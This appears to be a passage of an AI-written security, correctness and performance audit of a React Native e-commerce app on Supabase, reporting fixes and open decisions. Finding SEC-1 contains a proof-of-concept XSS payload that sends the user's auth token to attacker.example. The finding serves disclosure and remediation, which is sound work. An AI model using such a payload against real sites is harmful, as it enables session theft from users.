## 2. Security findings

### SEC-1 · HIGH · HTML/script injection in generated invoices — **FIXED**
**File:** [src/utils/invoice.js](src/utils/invoice.js)

The invoice is built by string-interpolating data into an HTML template. The only
sanitisation was `clean()`, which strips *complete* `<...>` tags:

```js
String(v ?? '').replace(/<[^>]*>/g, '').trim()
```

That is not escaping. Two gaps:

1. **An unterminated `<` passes through untouched** — the pattern requires a
   closing `>`. The next literal `>` in the template (e.g. from `</p>`) then
   terminates the attacker's tag for them.
2. **`&`, `"`, `'` were never handled at all**, so an attribute context could be
   broken out of (`<img src="${d.logo}" />`).

**Proof of concept.** Set your profile name to:

```
<img src=x onerror="fetch('https://attacker.example/?c='+localStorage.getItem('sb-<ref>-auth-token'))"
```

`clean()` leaves it intact (no `>`), and `<p>${d.customerName}</p>` renders it as
live markup.

**Why it is not merely self-XSS:** the injectable inputs include
`userDetails.name`/`address`/`phone` (the user's own editable profile — self),
but also `order.userName` (writable by the web admin order-create flow, for
*someone else's* invoice) and product `title` plus the whole `settings` row
(company name, **logo URL**, footer, UPI id) — admin-controlled values that render
into **every** customer's invoice.

**Impact by target:**
- **Web (`Platform.OS === 'web'`)** — `generateAndShareInvoice` does
  `printWindow.document.write(html)` into a `window.open('', '_blank')`.
  An `about:blank` window **inherits the opener's origin**, so injected script ran
  same-origin with the app and could read the persisted Supabase session. This is
  session-token theft, not a cosmetic bug.
- **Native** — renders inside expo-print's WebView with no app bridge. Confined,
  but still exfiltrates the invoice's own contents (name, address, phone, email,
  payment id) to an arbitrary host.

**Fix applied.** Added `esc()` (escapes `& < > " '`, ampersand first so the other
replacements aren't double-escaped) and `escUrl()` (scheme allowlist —
`https?:` and `data:image/*;base64,` only — because `javascript:` and
`data:text/html` contain no character `esc()` would touch). Applied to **every**
interpolation in `buildInvoiceHtml`; verified that the only remaining bare
interpolations are numeric (`l.idx`, `l.qty`) or a Map key, not HTML.

`clean()` is retained for its separate job (blank → fallback text).

**Regression tests:** `__tests__/logic/invoice.security.test.js` — 10 payload
classes × 7 injection points, plus scheme-allowlist and "benign text still reads
correctly" cases.

### SEC-2 · MEDIUM · `verifyOtp` redeemed whatever token `type` the deep link asked for — **FIXED**
**File:** [src/app/(auth)/reset-password.jsx](src/app/(auth)/reset-password.jsx)

```js
const { token_hash, type } = params;            // both from the deep link
await supabase.auth.verifyOtp({ token_hash, type });
```

The app registers the `ecommerceapp://` scheme, so anyone can hand the user a
crafted link. `type` selects which *token class* is being redeemed, so forwarding
it let an externally supplied link redeem e.g. an `email_change` or `invite` token
on a screen whose only control is "set a new password".

**Fix:** `type` is pinned to `'recovery'` and `token_hash` is coerced to a string.
This screen serves exactly one flow, so it accepts exactly one type.

### SEC-3 · MEDIUM · Every login sends the user's IP to a third party — **NEEDS YOUR DECISION**
**File:** [src/utils/sessionManager.js:59](src/utils/sessionManager.js#L59)

```js
fetch('https://api.ipify.org?format=json')
  .then(r => r.json())
  .then(d => d?.ip && supabase.from('profiles').update({ last_login_ip: d.ip }).eq('id', uid));
```

Every login performs an unauthenticated request to `api.ipify.org`, a third-party
service, and stores the result. An IP address is personal data under both GDPR and
India's DPDP Act. There is no consent step, no privacy-policy hook, and no
opt-out — and it silently adds an external dependency to the login path.

**I have not changed this**, because whether you collect login IPs at all is a
product/legal decision, not a code one. Three options:
1. **Drop it.** One-line deletion; nothing reads `last_login_ip` in this app.
2. **Move it server-side.** An Edge Function already sees the true client IP in
   its request headers — more accurate *and* no third-party egress.
3. **Keep it** and cover it in your privacy notice.

Option 2 is the one I'd recommend; it is strictly better on every axis.

### SEC-4 · MEDIUM · Admin blocking is presentational only — **BY DESIGN, STATE THE ASSUMPTION**
**File:** [src/app/(app)/_layout.jsx](src/app/(app)/_layout.jsx)

`user.role === 'admin'` renders a block screen. This is *correct* as UX, but it is
not a security boundary: the admin is fully authenticated at that point, holds a
valid JWT, and the block is client-side state anyone running a patched build can
skip.

**This is fine — provided Supabase RLS is the real boundary.** I cannot verify
that from here (no DB access). It must be true that RLS, not this screen, enforces:

- `profiles` — `select`/`update` restricted to `auth.uid() = id`
- `cart_items`, `wishlist_items`, `stock_alerts` — all CRUD restricted to
  `auth.uid() = user_id`
- `orders`, `order_items` — `select` restricted to owner; **no client `insert`**
  (orders come only from Edge Functions)
- `reviews` — **no client `insert`** (code comments assert this; confirm it)
- `promo_codes` — **no client `select`** (comments assert admin-only; confirm)
- `products`, `settings` — client `select` only, never `insert`/`update`

Worth writing a `supabase/tests/rls.sql` that asserts each of these with a
non-owner role, so it is enforced by CI rather than by comment.

The client-side writes that depend on this: `stock_alerts` insert
([WishlistCard.jsx](src/components/WishlistCard.jsx)) and the `profiles` update in
`logout()`/`registerNewSession()` both pass a client-supplied `uid`.

### SEC-5 · LOW · Admin login on mobile silently logs the admin out of the web dashboard — **NEEDS YOUR DECISION**
**File:** [src/hooks/useAuth.js](src/hooks/useAuth.js)

`login()` calls `registerNewSession(uid)` **before** any role check — the role
gate lives in `(app)/_layout.jsx`, which renders later. `registerNewSession`
overwrites `profiles.active_session_id`, and `useSessionWatcher` on the web app
sees the mismatch and force-logs-out. So an admin who merely *opens* the mobile
app is rejected by the mobile app **and** kicked out of the web admin dashboard
mid-session.

**Fix (small, but it changes login flow, so flagging rather than applying):** move
the role check ahead of `registerNewSession` in `login()` and throw before
claiming the session, e.g.

```js
if (profile.role === 'admin') throw new Error('Admin accounts are not supported in this app');
```

That also makes the rejection a clean login error rather than a post-login screen.

### SEC-6 · LOW · 42 `console.*` sites, several logging caught error objects — **PARTIALLY YOURS**
`console.*` is **not stripped from React Native release builds** by default. Sites
like `console.error('ORDER ERROR:', error)` in
[cart.jsx](src/app/(app)/(tabs)/cart.jsx) log whole error objects from the
Razorpay SDK and Supabase, which can carry payment metadata and request context,
into the device log — readable by other tooling on a rooted/jailbroken device and
by anything scraping logcat.

**Recommendation:** add `babel-plugin-transform-remove-console` for production
only, in `babel.config.js`:

```js
env: { production: { plugins: ['transform-remove-console'] } }
```

Keep `console.warn`/`error` if you prefer, but route them to a real reporter
(Sentry) rather than the device log. I did not add this because it changes build
output and needs a dependency you should choose deliberately.

### SEC-7 · LOW · WhatsApp order message embeds the auth user id — **INFORMATIONAL**
[cart.jsx](src/app/(app)/(tabs)/cart.jsx)'s `sendOrderToWhatsApp` puts
`Customer ID: ${user.uid}` — the Supabase auth subject id — into a message handed
to a third-party app. The recipient is your own merchant number, so this is
disclosure to an intended party, and it is source-faithful behaviour. But the uid
is an auth identifier, not an order number; `orderNo`-style reference would serve
the same operational purpose without exposing it. URL construction itself is
correct (`encodeURIComponent`), so there is no injection here.

## 3. Correctness findings

### LOG-1 · Cart quantity helpers disagreed with the reducer on item identity — **FIXED**
**File:** [src/services/supabaseCart.js](src/services/supabaseCart.js)

`CartSlice` resolves a line with `String(x.id || x.compound_id)`. The persistence
helpers used `String(x.id)` alone. For any item carrying only `compound_id`, the
reducer found the existing line and incremented it to 2 while
`nextAddQuantity` found nothing and returned 1 — so the DB was written with 1 over
a line Redux had just moved to 2. Silent until the next reload, at which point the
DB value won and the user's quantity appeared to revert.

**Fix:** extracted `cartIdOf()` matching the reducer exactly; both helpers now use
it, and both tolerate a null cart. Covered by
`__tests__/logic/cart-identity.test.js`, including a test that asserts the helpers
and the reducer agree for **both** id shapes.

### LOG-2 · `Math.max(...products)` would throw on a large catalog — **FIXED**
**File:** [src/app/(app)/(tabs)/products/index.jsx](src/app/(app)/(tabs)/products/index.jsx)

Spreading an array into `Math.max` passes one *argument* per element; the engine
argument limit (~65k on Hermes/JSC) makes this a `RangeError` that takes the
screen down rather than degrading. Replaced with `reduce`.

### LOG-3 · Cart writes are fire-and-forget — **NOT FIXED, NEEDS A PRODUCT DECISION**
`upsertCartItem(...)` / `decrementOrRemoveCartItem(...)` are called **without
`await`** in every UI handler, and their failures only reach `console.error`. With
the network down, Redux shows the item added, the user sees success, the DB never
receives it — and on next launch the cart reloads from the DB and the item is
silently gone.

Fixing properly means choosing a policy: optimistic-with-rollback, a retry queue,
or a synced/pending indicator. That is a design decision, so I have not guessed at
it. The narrowest improvement would be surfacing the failure via `toast.error` in
each service's catch block.

### LOG-4 · `realProductId` truncates ids containing an underscore — **INFORMATIONAL**
`src/services/supabaseCart.js`:
```js
const realProductId = product.productId || String(product.id || '').split('_')[0];
```
For a single product whose natural id contains `_`, the fallback yields the wrong
id. In practice `product.productId` is always set by `mapProductRow`, so the
fallback never runs — but it is a trap if a caller ever omits it. `parseCartIds`
does this correctly (splits on the `_var_` delimiter, not any underscore);
`realProductId` should reuse it.

### Verified correct (things I checked that turned out fine)
- **`parseCartIds` compound-id arithmetic.** `slice(idx + 1)` looks like an
  off-by-one but is right: it skips only the delimiter's leading `_`, preserving
  the variant's own `var_` prefix, which is what the DB stores. Traced by hand and
  pinned with tests for `p1_var_7` and the underscore-in-product-id case.
- **Cart rounding order** matches the documented server pipeline
  (`subtotal → round → + shipping − promo → max(0, round)`), including the
  `max(0, …)` clamp. Pinned by a test that distinguishes the two possible
  rounding orders.
- **`isDiscountActive`** handles all four expiry shapes (ISO string, the
  `dd/mm/yyyy hh:mm AM` fallback, epoch number, Firestore `toDate()`), and
  correctly stays *active* on an unparseable expiry rather than silently
  dropping a live discount.
- `ToastHost` pairs `backgroundColor: c.ink` with `color: c.inverse`; those two
  tokens invert together, so the pill is legible in both schemes.

## 4. Performance findings

### PERF-1 · HIGH IMPACT · Every review row in the database is fetched to compute averages — **YOURS (needs SQL)**
**File:** [products/index.jsx](src/app/(app)/(tabs)/products/index.jsx)

```js
const { data: reviewsData } = await supabase.from('reviews').select('product_id, rating');
```

This is an unbounded full-table read on **every cold start**, aggregated in JS.
At 100k reviews it is tens of MB over mobile data and a multi-second main-thread
reduce. This is the single biggest scalability problem in the app.

**Fix — a database view, then one cheap select:**
```sql
create or replace view product_ratings as
  select product_id,
         round(avg(rating)::numeric, 2) as avg_rating,
         count(*)                       as review_count
  from reviews
  group by product_id;

grant select on product_ratings to anon, authenticated;
```
then `supabase.from('product_ratings').select('*')` — one row per product instead
of one per review. Requires a migration, so it is yours to apply.

### PERF-2 · HIGH IMPACT · Whole catalog fetched with `select('*')`, unpaginated — **YOURS**
`supabase.from('products').select('*')` pulls every column of every row, including
`description`, `gallery`, `variants`, and `attributes` — none of which the grid
renders. Add `.select('id,title,category,price,discount,discount_expiry,stock,thumbnail,image,has_variants')`
plus `.range()` pagination and fetch the heavy columns only on the detail screen.
Left alone because paginating changes the screen's data-loading contract (and its
client-side "group by category" model), which is a bigger change than an audit
should make unasked.

### PERF-3 · `FlatList` was re-rendering every card on every keystroke — **FIXED**
`categorySections` was rebuilt inline on each render, so the `data` prop was a new
array of new objects every time. Any unrelated state change (a search keystroke,
opening the filter sheet) changed `data` by reference and re-rendered every
section and every card inside it. Now `useMemo`'d on `groupedProducts`.

### PERF-4 · `ProductCard` re-rendered the whole catalog on any cart change — **FIXED**
Each card subscribed to the entire `cartItems` **and** `wishlistItems` arrays.
Every mutation yields new array references, so tapping `+` on one card re-rendered
all of them. Now:
- selectors narrowed to just this card's line (`find`) and its wishlist boolean —
  Immer's structural sharing keeps the found item's identity stable while
  untouched, so unrelated changes no longer propagate;
- the full cart is read via `useStore().getState()` *inside* the tap handlers,
  where it's actually needed, keeping it out of the render subscription;
- the component is wrapped in `memo`.

### PERF-5 · Search lower-cased the needle once per product — **FIXED**
`search.toLowerCase()` was inside the filter predicate, so it ran once per catalog
item per keystroke. Hoisted.

### PERF-6 · Virtualisation is defeated by the nested map — **YOURS (structural)**
The `FlatList` virtualises at the *category* level, but each row renders all of
that category's products via `.map()`. A category with 500 products mounts 500
`ProductCard`s in a single row. The fix is a flat, windowed list — `FlatList` with
`numColumns={2}` over a flattened `[header, ...products]` array, or
`SectionList` — plus `initialNumToRender` / `windowSize` / `getItemLayout`.
That is a rewrite of the screen's list model, so it is flagged rather than done.

| 1 | Every `@/…` import resolves to a real file | **165 imports, all resolve** |

**The checker was itself validated**, because a checker that silently no-ops

validity, and anything requiring evaluation. It is a substitute for the *bundler's*
error class, not for ESLint or tests.

## 6. Honest positioning

You asked whether this is at the standard of a large commercial build. On the
axes this audit can see:

**Genuinely strong.** Server-authoritative pricing and payment verification.
No secrets in the bundle. Correct single-session semantics including the
`scope: 'local'` subtlety most implementations get wrong. Design-token discipline
with real dark-mode support. Documentation of *why* each port deviates from source
— unusually good, and the reason this audit could move quickly.

**Now fixed.** The invoice injection, the deep-link token-type confusion, the
cart-identity divergence, and the three render-performance defects.

**What still stands between this and that standard** — none of it code I should
have written unasked:

1. **RLS policy tests** (SEC-4). The entire authorisation model rests on
   assumptions asserted in comments. Until there is a test asserting a non-owner
   *cannot* read another user's orders, it is unverified.
2. **Catalog scalability** (PERF-1, PERF-2, PERF-6). The app currently loads the
   whole catalog and every review row on launch. This works at demo scale and
   falls over well before enterprise scale.
3. **Offline/failure semantics** (LOG-3). Silent write loss is the kind of defect
   that erodes trust fastest.
4. **No error reporting.** 42 `console.*` sites and no Sentry. In production you
   would be blind to crashes.
5. **No CI.** With a test suite now present, a GitHub Action running
   `npm run verify` on every PR is the cheapest possible quality ratchet.
6. **Device verification.** Razorpay needs a custom dev client; nothing here has
   run on a real device or simulator.
